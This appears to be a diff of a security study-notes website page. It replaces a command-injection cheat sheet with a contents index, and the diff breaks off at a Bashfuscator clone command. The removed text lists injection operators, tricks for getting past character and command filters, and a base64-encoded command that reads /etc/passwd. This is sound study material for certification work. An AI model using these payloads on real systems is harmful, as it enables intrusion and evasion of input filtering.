@@ -9,28 +9,28 @@
       
       
       
-        <link rel="prev" href="../broken-authentication/">
+        <link rel="prev" href="../whitebox-testing/process/">
       
       
-        <link rel="next" href="../cross-site-scripting-%28xss%29/">
+        <link rel="next" href="owasp-top-10-2025/">
       
       
         
       
       
-      <link rel="icon" href="../../../assets/images/favicon.png">
+      <link rel="icon" href="../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Command Injections - Dan's Cyber Stuff</title>
+        <title>Contents - Dan's Cyber Stuff</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -49,7 +49,7 @@
       
     
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#command-injections" class="md-skip">
+        <a href="#study-notes-contents" class="md-skip">
           Skip to content
         </a>
       
@@ -90,7 +90,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href=".." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -110,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Command Injections
+              Contents
             
           </span>
         </div>
@@ -214,7 +214,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href=".." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -232,7 +232,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href=".." class="md-nav__link">
         
   
   
@@ -306,7 +306,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../whitebox-testing/whitebox-testing/" class="md-nav__link">
+      <a href="../whitebox-testing/whitebox-testing/" class="md-nav__link">
         
   
   
@@ -334,7 +334,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../whitebox-testing/process/" class="md-nav__link">
+      <a href="../whitebox-testing/process/" class="md-nav__link">
         
   
   
@@ -415,10 +415,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Contents
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -434,6 +461,92 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#bug-bounty-hunting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bug Bounty Hunting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bscp-study-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BSCP Study Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cwee-study-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CWEE Study Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cwes-study-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CWES Study Notes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#android-application-pentesting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Android Application Pentesting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-and-protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools and Protocols
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -493,7 +606,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../owasp-top-10-2025/" class="md-nav__link">
+      <a href="owasp-top-10-2025/" class="md-nav__link">
         
   
   
@@ -521,7 +634,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../reconnaissance/" class="md-nav__link">
+      <a href="reconnaissance/" class="md-nav__link">
         
   
   
@@ -549,7 +662,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../reporting-and-poc/" class="md-nav__link">
+      <a href="reporting-and-poc/" class="md-nav__link">
         
   
   
@@ -577,7 +690,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tech-interview-prep/" class="md-nav__link">
+      <a href="tech-interview-prep/" class="md-nav__link">
         
   
   
@@ -660,7 +773,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../bscp-study-notes/" class="md-nav__link">
+      <a href="bscp-study-notes/" class="md-nav__link">
         
   
   
@@ -688,7 +801,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
+      <a href="bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -716,7 +829,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
+      <a href="bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -744,7 +857,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../bscp-study-notes/command-injection/" class="md-nav__link">
+      <a href="bscp-study-notes/command-injection/" class="md-nav__link">
         
   
   
@@ -772,7 +885,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../bscp-study-notes/cross-site-scripting/" class="md-nav__link">
+      <a href="bscp-study-notes/cross-site-scripting/" class="md-nav__link">
         
   
   
@@ -800,7 +913,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../bscp-study-notes/path-traversal/" class="md-nav__link">
+      <a href="bscp-study-notes/path-traversal/" class="md-nav__link">
         
   
   
@@ -828,7 +941,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../bscp-study-notes/sql-injection/" class="md-nav__link">
+      <a href="bscp-study-notes/sql-injection/" class="md-nav__link">
         
   
   
@@ -911,7 +1024,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/" class="md-nav__link">
+      <a href="cwee-study-notes/" class="md-nav__link">
         
   
   
@@ -939,7 +1052,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
+      <a href="cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
         
   
   
@@ -967,7 +1080,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/injection-attacks/" class="md-nav__link">
+      <a href="cwee-study-notes/injection-attacks/" class="md-nav__link">
         
   
   
@@ -995,7 +1108,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
+      <a href="cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
         
   
   
@@ -1023,7 +1136,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
+      <a href="cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
         
   
   
@@ -1056,20 +1169,18 @@
                 
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
         
           
           <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
@@ -1090,7 +1201,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1108,7 +1219,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../api-attacks/" class="md-nav__link">
+      <a href="cwes-study-notes/api-attacks/" class="md-nav__link">
         
   
   
@@ -1136,7 +1247,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../attacking-common-applications/" class="md-nav__link">
+      <a href="cwes-study-notes/attacking-common-applications/" class="md-nav__link">
         
   
   
@@ -1164,7 +1275,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../attacking-graphql/" class="md-nav__link">
+      <a href="cwes-study-notes/attacking-graphql/" class="md-nav__link">
         
   
   
@@ -1192,7 +1303,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../attacking-web-applications-with-ffuf/" class="md-nav__link">
+      <a href="cwes-study-notes/attacking-web-applications-with-ffuf/" class="md-nav__link">
         
   
   
@@ -1220,7 +1331,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../broken-authentication/" class="md-nav__link">
+      <a href="cwes-study-notes/broken-authentication/" class="md-nav__link">
         
   
   
@@ -1245,37 +1356,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Command Injections
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="cwes-study-notes/command-injections/" class="md-nav__link">
         
   
   
@@ -1291,154 +1375,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#injection-operators" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Injection Operators
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#linux" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Linux
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Linux">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#filtered-character-bypass" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Filtered Character Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#blacklisted-command-bypass" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Blacklisted Command Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#windows" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Windows
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Windows">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#filtered-character-bypass_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Filtered Character Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#blacklisted-command-bypass_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Blacklisted Command Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#evasion-tools" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Evasion Tools
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Evasion Tools">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#linux-bashfuscator" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Linux (Bashfuscator)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#windows-dosfuscation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Windows (DOSfuscation)
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1451,7 +1387,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cross-site-scripting-%28xss%29/" class="md-nav__link">
+      <a href="cwes-study-notes/cross-site-scripting-%28xss%29/" class="md-nav__link">
         
   
   
@@ -1479,7 +1415,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../file-inclusion/" class="md-nav__link">
+      <a href="cwes-study-notes/file-inclusion/" class="md-nav__link">
         
   
   
@@ -1507,7 +1443,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../file-upload-attacks/" class="md-nav__link">
+      <a href="cwes-study-notes/file-upload-attacks/" class="md-nav__link">
         
   
   
@@ -1535,7 +1471,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../hacking-wordpress/" class="md-nav__link">
+      <a href="cwes-study-notes/hacking-wordpress/" class="md-nav__link">
         
   
   
@@ -1563,7 +1499,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../javascript-deobfuscation/" class="md-nav__link">
+      <a href="cwes-study-notes/javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -1591,7 +1527,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../login-brute-forcing/" class="md-nav__link">
+      <a href="cwes-study-notes/login-brute-forcing/" class="md-nav__link">
         
   
   
@@ -1619,7 +1555,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../server-side-attacks/" class="md-nav__link">
+      <a href="cwes-study-notes/server-side-attacks/" class="md-nav__link">
         
   
   
@@ -1647,7 +1583,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../session-security/" class="md-nav__link">
+      <a href="cwes-study-notes/session-security/" class="md-nav__link">
         
   
   
@@ -1675,7 +1611,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sql-injection-fundamentals/" class="md-nav__link">
+      <a href="cwes-study-notes/sql-injection-fundamentals/" class="md-nav__link">
         
   
   
@@ -1703,7 +1639,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sqlmap-essentials/" class="md-nav__link">
+      <a href="cwes-study-notes/sqlmap-essentials/" class="md-nav__link">
         
   
   
@@ -1731,7 +1667,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-attacks/" class="md-nav__link">
+      <a href="cwes-study-notes/web-attacks/" class="md-nav__link">
         
   
   
@@ -1759,7 +1695,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-fuzzing/" class="md-nav__link">
+      <a href="cwes-study-notes/web-fuzzing/" class="md-nav__link">
         
   
   
@@ -1787,7 +1723,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-service-and-api-attacks/" class="md-nav__link">
+      <a href="cwes-study-notes/web-service-and-api-attacks/" class="md-nav__link">
         
   
   
@@ -1870,7 +1806,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/" class="md-nav__link">
+      <a href="android-application-pentesting/" class="md-nav__link">
         
   
   
@@ -1898,7 +1834,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/android-fundamentals/" class="md-nav__link">
+      <a href="android-application-pentesting/android-fundamentals/" class="md-nav__link">
         
   
   
@@ -1926,7 +1862,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
+      <a href="android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
         
   
   
@@ -1954,7 +1890,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
+      <a href="android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
         
   
   
@@ -2037,7 +1973,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/curl/" class="md-nav__link">
+      <a href="tools-and-protocols/curl/" class="md-nav__link">
         
   
   
@@ -2065,7 +2001,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/ftp/" class="md-nav__link">
+      <a href="tools-and-protocols/ftp/" class="md-nav__link">
         
   
   
@@ -2093,7 +2029,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/gobuster/" class="md-nav__link">
+      <a href="tools-and-protocols/gobuster/" class="md-nav__link">
         
   
   
@@ -2121,7 +2057,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tools-and-protocols/nmap/" class="md-nav__link">
+      <a href="tools-and-protocols/nmap/" class="md-nav__link">
         
   
   
@@ -2184,10 +2120,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#injection-operators" class="md-nav__link">
+  <a href="#bug-bounty-hunting" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Injection Operators
+        Bug Bounty Hunting
       
     </span>
   </a>
@@ -2195,119 +2131,57 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#linux" class="md-nav__link">
+  <a href="#bscp-study-notes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Linux
+        BSCP Study Notes
       
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Linux">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#filtered-character-bypass" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Filtered Character Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#blacklisted-command-bypass" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Blacklisted Command Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#windows" class="md-nav__link">
+  <a href="#cwee-study-notes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Windows
+        CWEE Study Notes
       
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Windows">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#filtered-character-bypass_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Filtered Character Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#blacklisted-command-bypass_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Blacklisted Command Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#evasion-tools" class="md-nav__link">
+  <a href="#cwes-study-notes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Evasion Tools
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Evasion Tools">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#linux-bashfuscator" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Linux (Bashfuscator)
+        CWES Study Notes
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#windows-dosfuscation" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#android-application-pentesting" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Windows (DOSfuscation)
+        Android Application Pentesting
       
     </span>
   </a>
   
 </li>
-        
-      </ul>
-    </nav>
+      
+        <li class="md-nav__item">
+  <a href="#tools-and-protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools and Protocols
+      
+    </span>
+  </a>
   
 </li>
       
@@ -2328,317 +2202,68 @@
 
 
 
-<h1 id="command-injections">Command Injections</h1>
-<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">PayloadAllTheThings Command Injection</a></p>
-<h2 id="injection-operators">Injection Operators</h2>
-<table>
-<thead>
-<tr>
-<th>Injection Operator</th>
-<th>Injection Character</th>
-<th>URL-Encoded Character</th>
-<th>Executed Command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Semicolon</td>
-<td>;</td>
-<td>%3b</td>
-<td>Both</td>
-</tr>
-<tr>
-<td>New Line</td>
-<td>\n</td>
-<td>%0a</td>
-<td>Both</td>
-</tr>
-<tr>
-<td>Background</td>
-<td>&amp;</td>
-<td>%26</td>
-<td>Both (second output generally shown first)</td>
-</tr>
-<tr>
-<td>Pipe</td>
-<td>|</td>
-<td>%7c</td>
-<td>Both (only second output is shown)</td>
-</tr>
-<tr>
-<td>AND</td>
-<td>&amp;&amp;</td>
-<td>%26%26</td>
-<td>Both (only if first succeeds)</td>
-</tr>
-<tr>
-<td>OR</td>
-<td>||</td>
-<td>%7c%7c</td>
-<td>Second (only if first fails)</td>
-</tr>
-<tr>
-<td>Sub-Shell</td>
-<td>``</td>
-<td>%60%60</td>
-<td>Both (Linux-only)</td>
-</tr>
-<tr>
-<td>Sub-Shell</td>
-<td>$()</td>
-<td>%24%28%29</td>
-<td>Both (Linux-only)</td>
-</tr>
-</tbody>
-</table>
-<h2 id="linux">Linux</h2>
-<h3 id="filtered-character-bypass">Filtered Character Bypass</h3>
-<table>
-<thead>
-<tr>
-<th>Code</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>printenv</code></td>
-<td>Can be used to view all environment variables</td>
-</tr>
-<tr>
-<td><strong>Spaces</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>%09</code></td>
-<td>Using tabs instead of spaces</td>
-</tr>
-<tr>
-<td><code>${IFS}</code> or <code>$IFS</code></td>
-<td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())</td>
-</tr>
-<tr>
-<td><code>{ls,-la}</code></td>
-<td>Bash brace exspansion (commas will be replaced with spaces)</td>
-</tr>
-<tr>
-<td><strong>Other Characters</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>${PATH:0:1}</code></td>
-<td>Will be replaced with /</td>
-</tr>
-<tr>
-<td><code>${LS_COLORS:10:1}</code></td>
-<td>Will be replaced with ;</td>
-</tr>
-<tr>
-<td><code>$(tr '!-}' '"-~'&lt;&lt;&lt;[)</code></td>
-<td>Shift character by one "[" (91) -&gt; "\" (92)</td>
-</tr>
-</tbody>
-</table>
-<h3 id="blacklisted-command-bypass">Blacklisted Command Bypass</h3>
-<table>
-<thead>
-<tr>
-<th>Code</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Character Insertion</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>' or "</code></td>
-<td>Total must be even example: <code>c"a"t</code></td>
-</tr>
-<tr>
-<td><code>$@ or \</code></td>
-<td>Linux only</td>
-</tr>
-<tr>
-<td><strong>Case Manipulation</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code></td>
-<td>Execute command regardless of cases (may need to replace spaces with tabs <code>%09</code>)</td>
-</tr>
-<tr>
-<td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td>
-<td>Another variation of the technique</td>
-</tr>
-<tr>
-<td><strong>Reversed Commands</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>echo 'whoami' | rev</code></td>
-<td>Reverse a string</td>
-</tr>
-<tr>
-<td><code>$(rev&lt;&lt;&lt;'imaohw')</code></td>
-<td>Execute reversed command</td>
-</tr>
-<tr>
-<td><strong>Encoded Commands</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>echo -n 'cat /etc/passwd \| grep 33' \| base64</code></td>
-<td>Encode a string with base64</td>
-</tr>
-<tr>
-<td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td>
-<td>Execute b64 encoded string</td>
-</tr>
-</tbody>
-</table>
-<h2 id="windows">Windows</h2>
-<h3 id="filtered-character-bypass_1">Filtered Character Bypass</h3>
-<table>
-<thead>
-<tr>
-<th>Code</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>Get-ChildItem Env:</code></td>
-<td>Can be used to view all environment variables - (PowerShell)</td>
-</tr>
-<tr>
-<td><strong>Spaces</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>%09</code></td>
-<td>Using tabs instead of spaces</td>
-</tr>
-<tr>
-<td><code>%PROGRAMFILES:~10,-5%</code></td>
-<td>Will be replaced with a space - (CMD)</td>
-</tr>
-<tr>
-<td><code>$env:PROGRAMFILES[10]</code></td>
-<td>Will be replaced with a space - (PowerShell)</td>
-</tr>
-<tr>
-<td><strong>Other Characters</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>%HOMEPATH:~0,-17%</code></td>
-<td>Will be replaced with \ - (CMD)</td>
-</tr>
-<tr>
-<td><code>$env:HOMEPATH[0]</code></td>
-<td>Will be replaced with \ - (PowerShell)</td>
-</tr>
-</tbody>
-</table>
-<h3 id="blacklisted-command-bypass_1">Blacklisted Command Bypass</h3>
-<table>
-<thead>
-<tr>
-<th>Code</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Character Insertion</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>' or "</code></td>
-<td>Total must be even</td>
-</tr>
-<tr>
-<td><code>^</code></td>
-<td>Windows only (CMD)</td>
-</tr>
-<tr>
-<td><strong>Case Manipulation</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>WhoAmi</code></td>
-<td>Simply send the character with odd cases</td>
-</tr>
-<tr>
-<td><strong>Reversed Commands</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>"whoami"[-1..-20] -join ''</code></td>
-<td>Reverse a string</td>
-</tr>
-<tr>
-<td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td>
-<td>Execute reversed command</td>
-</tr>
-<tr>
-<td><strong>Encoded Commands</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td>
-<td>Encode a string with base64</td>
-</tr>
-<tr>
-<td><code>echo -n whoami \| iconv -f utf-8 -t utf-16le \| base64</code></td>
-<td>Base 64 encode with linux to be decoded on windows</td>
-</tr>
-<tr>
-<td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td>
-<td>Execute b64 encoded string</td>
-</tr>
-</tbody>
-</table>
-<h2 id="evasion-tools">Evasion Tools</h2>
-<h3 id="linux-bashfuscator">Linux (Bashfuscator)</h3>
-<p>https://github.com/Bashfuscator/Bashfuscator</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span>
-<span class="normal">3</span>
-<span class="normal">4</span>
-<span class="normal">5</span>
-<span class="normal">6</span>
-<span class="normal">7</span>
-<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/Bashfuscator/Bashfuscator
